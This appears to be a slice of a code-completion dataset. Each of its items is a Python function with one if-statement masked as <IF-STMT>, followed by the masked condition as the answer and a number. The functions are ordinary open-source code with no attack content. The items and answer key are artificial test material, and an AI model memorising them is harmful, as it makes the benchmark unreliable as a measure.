231,"def _disconnect(self, sync):<tab><IF-STMT><tab><tab>if sync:<tab><tab><tab>try:<tab><tab><tab><tab>self._connection.send_all()<tab><tab><tab><tab>self._connection.fetch_all()<tab><tab><tab>except (WorkspaceError, ServiceUnavailable):<tab><tab><tab><tab>pass<tab><tab>if self._connection:<tab><tab><tab>self._connection.in_use = False<tab><tab><tab>self._connection = None<tab><tab>self._connection_access_mode = None",if self . _connection :,115
232,"def _recursive_process(self):<tab>super(RecursiveObjectDownwardsVisitor, self)._recursive_process()<tab>while self._new_for_visit:<tab><tab>func_ea, arg_idx = self._new_for_visit.pop()<tab><tab>if helper.is_imported_ea(func_ea):<tab><tab><tab>continue<tab><tab>cfunc = helper.decompile_function(func_ea)<tab><tab><IF-STMT><tab><tab><tab>assert arg_idx < len(cfunc.get_lvars()), ""Wrong argument at func {}"".format(<tab><tab><tab><tab>to_hex(func_ea)<tab><tab><tab>)<tab><tab><tab>obj = VariableObject(cfunc.get_lvars()[arg_idx], arg_idx)<tab><tab><tab>self.prepare_new_scan(cfunc, arg_idx, obj)<tab><tab><tab>self._recursive_process()",if cfunc :,199
233,"def to_dict(self) -> JSONDict:<tab>data = dict()<tab>for key in iter(self.__dict__):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value = self.__dict__[key]<tab><tab>if value is not None:<tab><tab><tab>if hasattr(value, ""to_dict""):<tab><tab><tab><tab>data[key] = value.to_dict()<tab><tab><tab>else:<tab><tab><tab><tab>data[key] = value<tab>if data.get(""from_user""):<tab><tab>data[""from""] = data.pop(""from_user"", None)<tab>return data","if key == ""bot"" or key . startswith ( ""_"" ) :",148
234,"def get_data(self, path, prefix=""""):<tab>item = self.store[path]<tab>path = ""{}/{}"".format(prefix, path)<tab>keys = [i for i in item.keys()]<tab>data = {""path"": path}<tab># print(path)<tab>for k in keys:<tab><tab><IF-STMT><tab><tab><tab>dataset = np.array(item[k].value)<tab><tab><tab>if type(dataset) is np.ndarray:<tab><tab><tab><tab>if dataset.size != 0:<tab><tab><tab><tab><tab>if type(dataset[0]) is np.bytes_:<tab><tab><tab><tab><tab><tab>dataset = [a.decode(""ascii"") for a in dataset]<tab><tab><tab>data.update({k: dataset})<tab>return data","if not isinstance ( item [ k ] , h5py . Group ) :",183
235,"def _macros_of_type(root, type, el_func):<tab>macros_el = root.find(""macros"")<tab>macro_dict = {}<tab>if macros_el is not None:<tab><tab>macro_els = macros_el.findall(""macro"")<tab><tab>filtered_els = [<tab><tab><tab>(macro_el.get(""name""), el_func(macro_el))<tab><tab><tab>for macro_el in macro_els<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab>macro_dict = dict(filtered_els)<tab>return macro_dict","if macro_el . get ( ""type"" ) == type",140
236,"def get_referrers(self):<tab>d = []<tab>for o in gc.get_referrers(self.obj):<tab><tab>name = None<tab><tab><IF-STMT><tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab><tab>for r in gc.get_referrers(o):<tab><tab><tab><tab>if getattr(r, ""__dict__"", None) is o:<tab><tab><tab><tab><tab>o = r<tab><tab><tab><tab><tab>break<tab><tab>elif isinstance(o, dict):  # other dict types<tab><tab><tab>name = web.dictfind(o, self.obj)<tab><tab>if not isinstance(name, six.string_types):<tab><tab><tab>name = None<tab><tab>d.append(Object(o, name))<tab>return d","if isinstance ( o , dict ) :",187
237,"def MakeWidthArray(fm):<tab># Make character width array<tab>s = ""{\n\t""<tab>cw = fm[""Widths""]<tab>for i in xrange(0, 256):<tab><tab>if chr(i) == ""'"":<tab><tab><tab>s += ""'\\''""<tab><tab><IF-STMT><tab><tab><tab>s += ""'\\\\'""<tab><tab>elif i >= 32 and i <= 126:<tab><tab><tab>s += ""'"" + chr(i) + ""'""<tab><tab>else:<tab><tab><tab>s += ""chr(%d)"" % i<tab><tab>s += "":"" + fm[""Widths""][i]<tab><tab>if i < 255:<tab><tab><tab>s += "",""<tab><tab>if (i + 1) % 22 == 0:<tab><tab><tab>s += ""\n\t""<tab>s += ""}""<tab>return s","elif chr ( i ) == ""\\"" :",192
238,"def getLatestFile(self):<tab>highestNsp = None<tab>highestNsx = None<tab>for nsp in self.getFiles():<tab><tab>try:<tab><tab><tab>if nsp.path.endswith("".nsx""):<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>highestNsx = nsp<tab><tab><tab>else:<tab><tab><tab><tab>if not highestNsp or int(nsp.version) > int(highestNsp.version):<tab><tab><tab><tab><tab>highestNsp = nsp<tab><tab>except BaseException:<tab><tab><tab>pass<tab>return highestNsp or highestNsx",if not highestNsx or int ( nsp . version ) > int ( highestNsx . version ) :,152
239,"def _check_integrity(self) -> bool:<tab># Allow original archive to be deleted (zip). Only need the extracted images<tab>all_files = self.FILE_LIST.copy()<tab>all_files.append(self.ANNOTATIONS_FILE)<tab>for (_, md5, filename) in all_files:<tab><tab>file, ext = os.path.splitext(filename)<tab><tab>extracted_dir = os.path.join(self.root, file)<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if not os . path . exists ( extracted_dir ) :,132
240,"def load_core(self):<tab>for filename in os.listdir(self.path):<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>name = filename.replace("".py"", """")<tab><tab><tab><tab>mod = load_python_module(name, self.path)<tab><tab><tab><tab>self._load_cmd_from(mod)<tab><tab><tab>except:<tab><tab><tab><tab>warnings.warn(<tab><tab><tab><tab><tab>""!! Warning: could not load core command file "" + filename,<tab><tab><tab><tab><tab>RuntimeWarning,<tab><tab><tab><tab>)","if filename != ""__init__.py"" and filename . endswith ( "".py"" ) :",142
241,"def _make_dataset(key, data, size):<tab>if isinstance(data, chainer.get_array_types()):<tab><tab>if key is None:<tab><tab><tab>key = ""_{}"".format(id(data))<tab><tab>return _Array(key, data)<tab>elif isinstance(data, list):<tab><tab>if key is None:<tab><tab><tab>key = ""_{}"".format(id(data))<tab><tab>return _List(key, data)<tab>elif callable(data):<tab><tab>if key is None:<tab><tab><tab>raise ValueError(""key(s) must be specified for callable"")<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""size must be specified for callable"")<tab><tab>return _Index(size).transform(key, data)",if size is None :,173
242,"def main_loop(self) -> None:<tab>while True:<tab><tab>try:<tab><tab><tab>message = self.control.get(block=False)<tab><tab>except Empty:<tab><tab><tab>message = None<tab><tab>if message == ""ABORT"":<tab><tab><tab>self.log.info(""Got ABORT message, main_loop exiting..."")<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>self.log.error(""One or more watcher died, committing suicide!"")<tab><tab><tab>sys.exit(1)<tab><tab>if self.all_workers_dead():<tab><tab><tab>self.log.error(""All workers have died, committing suicide!"")<tab><tab><tab>sys.exit(1)<tab><tab>self.check_and_start_workers()<tab><tab>time.sleep(0.1)",if not self . all_watchers_running ( ) :,197
243,"def execute_map(cls, ctx, op):<tab>(x,), device_id, xp = as_same_device(<tab><tab>[ctx[c.key] for c in op.inputs], op.device, ret_extra=True<tab>)<tab>axis = cls.get_arg_axis(op.axis, op.inputs[0].ndim)<tab>keepdims = op.keepdims<tab>with device(device_id):<tab><tab>nz = xp.count_nonzero(x, axis=axis)<tab><tab><IF-STMT><tab><tab><tab>slcs = [slice(None)] * op.inputs[0].ndim<tab><tab><tab>for ax in op.axis:<tab><tab><tab><tab>slcs[ax] = np.newaxis<tab><tab><tab>nz = xp.asarray(nz)[tuple(slcs)]<tab><tab>ctx[op.outputs[0].key] = nz",if keepdims :,195
244,"def setfilter(self, f):<tab>filter_exp = create_string_buffer(f.encode(""ascii""))<tab>if pcap_compile(self.pcap, byref(self.bpf_program), filter_exp, 0, -1) == -1:<tab><tab>error(""Could not compile filter expression %s"" % f)<tab><tab>return False<tab>else:<tab><tab><IF-STMT><tab><tab><tab>error(""Could not install filter %s"" % f)<tab><tab><tab>return False<tab>return True","if pcap_setfilter ( self . pcap , byref ( self . bpf_program ) ) == - 1 :",141
245,"def find_parent_for_new_to(self, pos):<tab>""""""Figure out the parent object for something at 'pos'.""""""<tab>for children in self._editable_children:<tab><tab>if children._start <= pos < children._end:<tab><tab><tab>return children.find_parent_for_new_to(pos)<tab><tab><IF-STMT><tab><tab><tab>return children.find_parent_for_new_to(pos)<tab>return self",if children . _start == pos and pos == children . _end :,113
246,"def process_events(self, events):<tab>for event in events:<tab><tab>key = (event.ident, event.filter)<tab><tab><IF-STMT><tab><tab><tab>self._force_wakeup.drain()<tab><tab><tab>continue<tab><tab>receiver = self._registered[key]<tab><tab>if event.flags & select.KQ_EV_ONESHOT:<tab><tab><tab>del self._registered[key]<tab><tab>if type(receiver) is _core.Task:<tab><tab><tab>_core.reschedule(receiver, outcome.Value(event))<tab><tab>else:<tab><tab><tab>receiver.put_nowait(event)",if event . ident == self . _force_wakeup_fd :,154
247,"def test_tag(artifact_obj, sagemaker_session):<tab>tag = {""Key"": ""foo"", ""Value"": ""bar""}<tab>artifact_obj.set_tag(tag)<tab>while True:<tab><tab>actual_tags = sagemaker_session.sagemaker_client.list_tags(<tab><tab><tab>ResourceArn=artifact_obj.artifact_arn<tab><tab>)[""Tags""]<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>time.sleep(5)<tab># When sagemaker-client-config endpoint-url is passed as argument to hit some endpoints,<tab># length of actual tags will be greater than 1<tab>assert len(actual_tags) > 0<tab>assert actual_tags[0] == tag",if actual_tags :,170
248,"def initialize(self) -> None:<tab>""""""Move the API keys from cog stored config to core bot config if they exist.""""""<tab>imgur_token = await self.config.imgur_client_id()<tab>if imgur_token is not None:<tab><tab><IF-STMT><tab><tab><tab>await self.bot.set_shared_api_tokens(""imgur"", client_id=imgur_token)<tab><tab>await self.config.imgur_client_id.clear()","if not await self . bot . get_shared_api_tokens ( ""imgur"" ) :",126
249,"def _sorted_layers(self, structure, top_layer_id):<tab>""""""Return the image layers sorted""""""<tab>sorted_layers = []<tab>next_layer = top_layer_id<tab>while next_layer:<tab><tab>sorted_layers.append(next_layer)<tab><tab>if ""json"" not in structure[""repolayers""][next_layer]:  # v2<tab><tab><tab>break<tab><tab>if ""parent"" not in structure[""repolayers""][next_layer][""json""]:<tab><tab><tab>break<tab><tab>next_layer = structure[""repolayers""][next_layer][""json""][""parent""]<tab><tab><IF-STMT><tab><tab><tab>break<tab>return sorted_layers",if not next_layer :,162
250,"def __init__(self, bounds, channel_axis, preprocess=None):<tab>assert len(bounds) == 2<tab>assert channel_axis in [0, 1, 2, 3]<tab>self._bounds = bounds<tab>self._channel_axis = channel_axis<tab># Make self._preprocess to be (0,1) if possible, so that don't need<tab># to do substract or divide.<tab>if preprocess is not None:<tab><tab>sub, div = np.array(preprocess)<tab><tab><IF-STMT><tab><tab><tab>sub = 0<tab><tab>if np.all(div == 1):<tab><tab><tab>div = 1<tab><tab>assert (div is None) or np.all(div)<tab><tab>self._preprocess = (sub, div)<tab>else:<tab><tab>self._preprocess = (0, 1)",if not np . any ( sub ) :,194
251,"def unpickle(fname):<tab>""""""Load pickled object from `fname`""""""<tab>with smart_open(fname, ""rb"") as f:<tab><tab># Because of loading from S3 load can't be used (missing readline in smart_open)<tab><tab><IF-STMT><tab><tab><tab>return _pickle.load(f, encoding=""latin1"")<tab><tab>else:<tab><tab><tab>return _pickle.loads(f.read())","if sys . version_info > ( 3 , 0 ) :",105
252,"def get_new_setup_py_lines():<tab>global version<tab>with open(""setup.py"", ""r"") as sf:<tab><tab>current_setup = sf.readlines()<tab>for line in current_setup:<tab><tab><IF-STMT><tab><tab><tab>major, minor = re.findall(r""VERSION = '(\d+)\.(\d+)'"", line)[0]<tab><tab><tab>version = ""{}.{}"".format(major, int(minor) + 1)<tab><tab><tab>yield ""VERSION = '{}'\n"".format(version)<tab><tab>else:<tab><tab><tab>yield line","if line . startswith ( ""VERSION = "" ) :",136
253,"def make_buffers_dict(observables):<tab>""""""Makes observable states in a dict.""""""<tab># Use `type(observables)` so that our output structure respects the<tab># original dict subclass (e.g. OrderedDict).<tab>out_dict = type(observables)()<tab>for key, value in six.iteritems(observables):<tab><tab><IF-STMT><tab><tab><tab>out_dict[key] = _EnabledObservable(<tab><tab><tab><tab>value, physics, random_state, self._strip_singleton_buffer_dim<tab><tab><tab>)<tab>return out_dict",if value . enabled :,137
254,"def _callFUT(self, config_file, global_conf=None, _loader=None):<tab>import pyramid.paster<tab>old_loader = pyramid.paster.get_config_loader<tab>try:<tab><tab><IF-STMT><tab><tab><tab>pyramid.paster.get_config_loader = _loader<tab><tab>return pyramid.paster.setup_logging(config_file, global_conf)<tab>finally:<tab><tab>pyramid.paster.get_config_loader = old_loader",if _loader is not None :,125
255,"def _csv(self, match=None, dump=None):<tab>if dump is None:<tab><tab>dump = self._dump(match)<tab>for record in dump:<tab><tab>row = []<tab><tab>for field in record:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>row.append(""%i"" % field)<tab><tab><tab>elif field is None:<tab><tab><tab><tab>row.append("""")<tab><tab><tab>else:<tab><tab><tab><tab>row.append(""'%s'"" % field)<tab><tab>yield "","".join(row)","if isinstance ( field , int ) :",126
256,"def preprocess_envs(args_envs):<tab>envs_map = {}<tab>for item in args_envs:<tab><tab>i = item.find("":"")<tab><tab><IF-STMT><tab><tab><tab>key = item[:i]<tab><tab><tab>val = item[i + 1 :]<tab><tab>envs_map[key] = val<tab>return envs_map",if i != - 1 :,83
257,"def _get_most_recent_update(self, versions):<tab>recent = None<tab>for version in versions:<tab><tab>updated = datetime.datetime.strptime(version[""updated""], ""%Y-%m-%dT%H:%M:%SZ"")<tab><tab><IF-STMT><tab><tab><tab>recent = updated<tab><tab>elif updated > recent:<tab><tab><tab>recent = updated<tab>return recent.strftime(""%Y-%m-%dT%H:%M:%SZ"")",if not recent :,103
258,"def _to_string_infix(self, ostream, idx, verbose):<tab>if verbose:<tab><tab>ostream.write("" , "")<tab>else:<tab><tab><IF-STMT><tab><tab><tab>ostream.write("" - "")<tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>ostream.write("" + "")",if type ( self . _args [ idx ] ) is _NegationExpression :,90
259,"def __init__(self, bert, num_classes=2, dropout=0.0, prefix=None, params=None):<tab>super(BERTClassifier, self).__init__(prefix=prefix, params=params)<tab>self.bert = bert<tab>with self.name_scope():<tab><tab>self.classifier = nn.HybridSequential(prefix=prefix)<tab><tab><IF-STMT><tab><tab><tab>self.classifier.add(nn.Dropout(rate=dropout))<tab><tab>self.classifier.add(nn.Dense(units=num_classes))",if dropout :,124
260,"def __iter__(self):<tab>for i, field in enumerate(self.fields):<tab><tab><IF-STMT><tab><tab><tab>yield AdminReadonlyField(<tab><tab><tab><tab>self.form, field, is_first=(i == 0), model_admin=self.model_admin<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>yield AdminField(self.form, field, is_first=(i == 0))",if field in self . readonly_fields :,102
261,"def boolean(value):<tab>if isinstance(value, str):<tab><tab>v = value.lower()<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>if v in (""0"", ""no"", ""false"", ""off""):<tab><tab><tab>return False<tab><tab>raise ValueError(value)<tab>return bool(value)","if v in ( ""1"" , ""yes"" , ""true"" , ""on"" ) :",87
262,"def xdir(obj, return_values=False):<tab>for attr in dir(obj):<tab><tab><IF-STMT><tab><tab><tab>if return_values:<tab><tab><tab><tab>yield attr, getattr(obj, attr)<tab><tab><tab>else:<tab><tab><tab><tab>yield attr","if attr [ : 2 ] != ""__"" and attr [ - 2 : ] != ""__"" :",76
263,"def get_current_stock(self):<tab>for d in self.get(""supplied_items""):<tab><tab><IF-STMT><tab><tab><tab>bin = frappe.db.sql(<tab><tab><tab><tab>""select actual_qty from `tabBin` where item_code = %s and warehouse = %s"",<tab><tab><tab><tab>(d.rm_item_code, self.supplier_warehouse),<tab><tab><tab><tab>as_dict=1,<tab><tab><tab>)<tab><tab><tab>d.current_stock = bin and flt(bin[0][""actual_qty""]) or 0",if self . supplier_warehouse :,138
264,"def getvars(request, excludes):<tab>getvars = request.GET.copy()<tab>excludes = excludes.split("","")<tab>for p in excludes:<tab><tab><IF-STMT><tab><tab><tab>del getvars[p]<tab><tab>if len(getvars.keys()) > 0:<tab><tab><tab>return ""&%s"" % getvars.urlencode()<tab><tab>else:<tab><tab><tab>return """"",if p in getvars :,94
265,"def read(cls, reader, dump=None):<tab>code = reader.read_u1()<tab># Create an index of all known opcodes.<tab>if Opcode.opcodes is None:<tab><tab>Opcode.opcodes = {}<tab><tab>for name in globals():<tab><tab><tab>klass = globals()[name]<tab><tab><tab>try:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>Opcode.opcodes[klass.code] = klass<tab><tab><tab>except TypeError:<tab><tab><tab><tab>pass<tab>instance = Opcode.opcodes[code].read_extra(reader, dump)<tab>if dump:<tab><tab>reader.debug(""<tab>"" * dump, ""%3d: %s"" % (reader.offset, instance))<tab>return instance","if name != ""Opcode"" and issubclass ( klass , Opcode ) :",181
266,"def clean(self):<tab>username = self.cleaned_data.get(""username"")<tab>password = self.cleaned_data.get(""password"")<tab>message = ERROR_MESSAGE<tab>if username and password:<tab><tab>self.user_cache = authenticate(username=username, password=password)<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>message % {""username"": self.username_field.verbose_name}<tab><tab><tab>)<tab><tab>elif not self.user_cache.is_active or not self.user_cache.is_staff:<tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>message % {""username"": self.username_field.verbose_name}<tab><tab><tab>)<tab>return self.cleaned_data",if self . user_cache is None :,177
267,"def currentLevel(self):<tab>currentStr = """"<tab>for stackType, stackValue in self.stackVals:<tab><tab>if stackType == ""dict"":<tab><tab><tab>if isinstance(stackValue, str):<tab><tab><tab><tab>currentStr += ""['"" + stackValue + ""']""<tab><tab><tab>else:  # numeric key...<tab><tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab><IF-STMT><tab><tab><tab>currentStr += ""["" + str(stackValue) + ""]""<tab><tab>elif stackType == ""getattr"":<tab><tab><tab>currentStr += "".__getattribute__('"" + stackValue + ""')""<tab><tab>else:<tab><tab><tab>raise Exception(f""Cannot get attribute of type {stackType}"")<tab>return currentStr","elif stackType == ""listLike"" :",176
268,"def dump(self, out=sys.stdout, code2cid=None, code=None):<tab>if code2cid is None:<tab><tab>code2cid = self.code2cid<tab><tab>code = ()<tab>for (k, v) in sorted(code2cid.iteritems()):<tab><tab>c = code + (k,)<tab><tab><IF-STMT><tab><tab><tab>out.write(""code %r = cid %d\n"" % (c, v))<tab><tab>else:<tab><tab><tab>self.dump(out=out, code2cid=v, code=c)<tab>return","if isinstance ( v , int ) :",140
269,"def __init__(self, text, menu):<tab>self.text = text<tab>self.menu = menu<tab>print(text)<tab>for i, option in enumerate(menu):<tab><tab>menunum = i + 1<tab><tab># Check to see if this line has the 'return to main menu' code<tab><tab>match = re.search(""0D"", option)<tab><tab># If it's not the return to menu line:<tab><tab>if not match:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print((""   %s) %s"" % (menunum, option)))<tab><tab><tab>else:<tab><tab><tab><tab>print((""  %s) %s"" % (menunum, option)))<tab><tab>else:<tab><tab><tab>print(""\n  99) Return to Main Menu\n"")<tab>return",if menunum < 10 :,193
270,"def receive(self, sock):<tab>""""""Receive a message on ``sock``.""""""<tab>msg = None<tab>data = b""""<tab>recv_done = False<tab>recv_len = -1<tab>while not recv_done:<tab><tab>buf = sock.recv(BUFSIZE)<tab><tab>if buf is None or len(buf) == 0:<tab><tab><tab>raise Exception(""socket closed"")<tab><tab><IF-STMT><tab><tab><tab>recv_len = struct.unpack("">I"", buf[:4])[0]<tab><tab><tab>data += buf[4:]<tab><tab><tab>recv_len -= len(data)<tab><tab>else:<tab><tab><tab>data += buf<tab><tab><tab>recv_len -= len(buf)<tab><tab>recv_done = recv_len == 0<tab>msg = pickle.loads(data)<tab>return msg",if recv_len == - 1 :,192
271,"def apply_shortcuts(self):<tab>""""""Apply shortcuts settings to all widgets/plugins""""""<tab>toberemoved = []<tab>for index, (qobject, context, name, default) in enumerate(self.shortcut_data):<tab><tab>keyseq = QKeySequence(get_shortcut(context, name, default))<tab><tab>try:<tab><tab><tab>if isinstance(qobject, QAction):<tab><tab><tab><tab>qobject.setShortcut(keyseq)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>qobject.setKey(keyseq)<tab><tab>except RuntimeError:<tab><tab><tab># Object has been deleted<tab><tab><tab>toberemoved.append(index)<tab>for index in sorted(toberemoved, reverse=True):<tab><tab>self.shortcut_data.pop(index)","elif isinstance ( qobject , QShortcut ) :",184
272,"def _resolved_values(self):<tab>values = []<tab>for k, v in self.values.items() if hasattr(self.values, ""items"") else self.values:<tab><tab><IF-STMT><tab><tab><tab>if isinstance(k, util.string_types):<tab><tab><tab><tab>desc = _entity_descriptor(self.mapper, k)<tab><tab><tab><tab>values.extend(desc._bulk_update_tuples(v))<tab><tab><tab>elif isinstance(k, attributes.QueryableAttribute):<tab><tab><tab><tab>values.extend(k._bulk_update_tuples(v))<tab><tab><tab>else:<tab><tab><tab><tab>values.append((k, v))<tab><tab>else:<tab><tab><tab>values.append((k, v))<tab>return values",if self . mapper :,176
273,"def remove_callback(self, callback, events=None):<tab>if events is None:<tab><tab>for event in self._plugin_lifecycle_callbacks:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._plugin_lifecycle_callbacks[event].remove(callback)<tab>else:<tab><tab>if isinstance(events, basestring):<tab><tab><tab>events = [events]<tab><tab>for event in events:<tab><tab><tab>if callback in self._plugin_lifecycle_callbacks[event]:<tab><tab><tab><tab>self._plugin_lifecycle_callbacks[event].remove(callback)",if callback in self . _plugin_lifecycle_callbacks [ event ] :,148
274,"def _thd_parse_volumes(self, volumes):<tab>volume_list = []<tab>binds = {}<tab>for volume_string in volumes or []:<tab><tab>try:<tab><tab><tab>bind, volume = volume_string.split("":"", 1)<tab><tab>except ValueError:<tab><tab><tab>config.error(<tab><tab><tab><tab>""Invalid volume definition for docker ""<tab><tab><tab><tab>""%s. Skipping..."" % volume_string<tab><tab><tab>)<tab><tab><tab>continue<tab><tab>ro = False<tab><tab><IF-STMT><tab><tab><tab>ro = volume[-2:] == ""ro""<tab><tab><tab>volume = volume[:-3]<tab><tab>volume_list.append(volume)<tab><tab>binds[bind] = {""bind"": volume, ""ro"": ro}<tab>return volume_list, binds","if volume . endswith ( "":ro"" ) or volume . endswith ( "":rw"" ) :",191
275,"def __init__(self, model, **kwargs):<tab>self.model = model<tab>for key, value in kwargs.items():<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""%s() received an invalid keyword %r"" % (self.__class__.__name__, key)<tab><tab><tab>)<tab><tab>setattr(self, key, value)<tab>self.handle_model()","if not hasattr ( self , key ) :",97
276,"def __getitem__(self, key):<tab>if isinstance(key, numbers.Number):<tab><tab>l = len(self)<tab><tab>if key >= l:<tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab>if key < 0:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise IndexError(""Index %s out of range (%s elements)"" % (key, l))<tab><tab><tab>key += l<tab><tab>return self(key + 1)<tab>elif isinstance(key, slice):<tab><tab>raise ValueError(<tab><tab><tab>self.impl.__class__.__name__ + "" object does not support slicing""<tab><tab>)<tab>else:<tab><tab>return self(key)",if key < - l :,170
277,"def _get_formatted(self, model, key):<tab>value = model._type(key).format(model.get(key))<tab>if isinstance(value, bytes):<tab><tab>value = value.decode(""utf-8"", ""ignore"")<tab>if self.for_path:<tab><tab>sep_repl = beets.config[""path_sep_replace""].as_str()<tab><tab>for sep in (os.path.sep, os.path.altsep):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = value.replace(sep, sep_repl)<tab>return value",if sep :,133
278,"def publish(self, name, stat):<tab>try:<tab><tab>topic = ""stat.%s"" % str(name)<tab><tab><IF-STMT><tab><tab><tab>topic += "".%d"" % stat[""subtopic""]<tab><tab>stat = json.dumps(stat)<tab><tab>logger.debug(""Sending %s"" % stat)<tab><tab>self.socket.send_multipart([b(topic), stat])<tab>except zmq.ZMQError:<tab><tab>if self.socket.closed:<tab><tab><tab>pass<tab><tab>else:<tab><tab><tab>raise","if ""subtopic"" in stat :",130
279,def logic():<tab>while 1:<tab><tab>yield a<tab><tab>var = 0<tab><tab>out.next = 0<tab><tab>for i in downrange(len(a)):<tab><tab><tab>if a[i] == 0:<tab><tab><tab><tab>continue<tab><tab><tab>else:<tab><tab><tab><tab>for j in downrange(i - 1):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>pass<tab><tab><tab><tab><tab>else:<tab><tab><tab><tab><tab><tab>out.next = j<tab><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>break,if a [ j ] == 0 :,136
280,"def get_abstract_models(self, appmodels):<tab>abstract_models = []<tab>for appmodel in appmodels:<tab><tab>abstract_models += [<tab><tab><tab>abstract_model<tab><tab><tab>for abstract_model in appmodel.__bases__<tab><tab><tab><IF-STMT><tab><tab>]<tab>abstract_models = list(set(abstract_models))  # remove duplicates<tab>return abstract_models","if hasattr ( abstract_model , ""_meta"" ) and abstract_model . _meta . abstract",108
281,"def _sanitize_field_name(self, field_name: str) -> str:<tab>try:<tab><tab>if self._meta.get_field(field_name).get_internal_type() == ""ForeignKey"":<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return field_name + ""_id""<tab>except FieldDoesNotExist:<tab><tab>pass<tab>return field_name","if not field_name . endswith ( ""_id"" ) :",92
282,"def find_enabled_item(self, e):<tab>x, y = e.local<tab>if (<tab><tab>0<tab><tab><= x<tab><tab>< (<tab><tab><tab>self.width - self.margin - self.scroll_button_size<tab><tab><tab>if self.scrolling<tab><tab><tab>else self.width<tab><tab>)<tab>):<tab><tab>h = self.font.get_linesize()<tab><tab>i = (y - h // 2) // h + self.scroll<tab><tab>items = self._items<tab><tab><IF-STMT><tab><tab><tab>item = items[i]<tab><tab><tab>if item.enabled:<tab><tab><tab><tab>return item",if 0 <= i < len ( items ) :,160
283,"def addColumn(self, *cols, index=None):<tab>""Insert all *cols* into columns at *index*, or append to end of columns if *index* is None.  Return first column.""<tab>for i, col in enumerate(cols):<tab><tab>vd.addUndo(self.columns.remove, col)<tab><tab><IF-STMT><tab><tab><tab>index = len(self.columns)<tab><tab>col.recalc(self)<tab><tab>self.columns.insert(index + i, col)<tab><tab>Sheet.visibleCols.fget.cache_clear()<tab>return cols[0]",if index is None :,141
284,"def _compare_values(self, result, source):<tab>from google.protobuf.struct_pb2 import ListValue<tab>from google.protobuf.struct_pb2 import Value<tab>for found, expected in zip(result, source):<tab><tab>self.assertIsInstance(found, ListValue)<tab><tab>self.assertEqual(len(found.values), len(expected))<tab><tab>for found_cell, expected_cell in zip(found.values, expected):<tab><tab><tab>self.assertIsInstance(found_cell, Value)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.assertEqual(int(found_cell.string_value), expected_cell)<tab><tab><tab>else:<tab><tab><tab><tab>self.assertEqual(found_cell.string_value, expected_cell)","if isinstance ( expected_cell , int ) :",179
285,"def _traverse(op):<tab>if topi.tag.is_broadcast(op.tag):<tab><tab>if not op.same_as(output.op):<tab><tab><tab>if not op.axis:<tab><tab><tab><tab>const_ops.append(op)<tab><tab><tab>else:<tab><tab><tab><tab>ewise_ops.append(op)<tab><tab>for tensor in op.input_tensors:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ewise_inputs.append((op, tensor))<tab><tab><tab>else:<tab><tab><tab><tab>_traverse(tensor.op)<tab>else:<tab><tab>assert op.tag == ""dense_pack""<tab><tab>dense_res.append(op)","if isinstance ( tensor . op , tvm . te . PlaceholderOp ) :",174
286,"def update_annotation(<tab>parameters: Sequence[cst.Param], annotations: Sequence[cst.Param]) -> List[cst.Param]:<tab>parameter_annotations = {}<tab>annotated_parameters = []<tab>for parameter in annotations:<tab><tab><IF-STMT><tab><tab><tab>parameter_annotations[parameter.name.value] = parameter.annotation<tab>for parameter in parameters:<tab><tab>key = parameter.name.value<tab><tab>if key in parameter_annotations and (<tab><tab><tab>self.overwrite_existing_annotations or not parameter.annotation<tab><tab>):<tab><tab><tab>parameter = parameter.with_changes(annotation=parameter_annotations[key])<tab><tab>annotated_parameters.append(parameter)<tab>return annotated_parameters",if parameter . annotation :,167
287,"def _modules(self, module_paths, component_name):<tab>for path in module_paths:<tab><tab>for filename in os.listdir(path):<tab><tab><tab>name, ext = os.path.splitext(filename)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>root_relative_path = os.path.join(path, name)[<tab><tab><tab><tab><tab>len(self.root_path) + len(os.path.sep) :<tab><tab><tab><tab>]<tab><tab><tab><tab>module_name = ""%s.%s"" % (<tab><tab><tab><tab><tab>component_name,<tab><tab><tab><tab><tab>root_relative_path.replace(os.path.sep, "".""),<tab><tab><tab><tab>)<tab><tab><tab><tab>yield module_name","if ext . endswith ( "".py"" ) :",176
288,"def run(self):<tab># Make some objects emit lights<tab>for obj in bpy.context.scene.objects:<tab><tab>if ""modelId"" in obj:<tab><tab><tab>obj_id = obj[""modelId""]<tab><tab><tab># In the case of the lamp<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._make_lamp_emissive(obj, self.lights[obj_id])<tab><tab><tab># Make the windows emit light<tab><tab><tab>if obj_id in self.windows:<tab><tab><tab><tab>self._make_window_emissive(obj)<tab><tab><tab># Also make ceilings slightly emit light<tab><tab><tab>if obj.name.startswith(""Ceiling#""):<tab><tab><tab><tab>self._make_ceiling_emissive(obj)",if obj_id in self . lights :,190
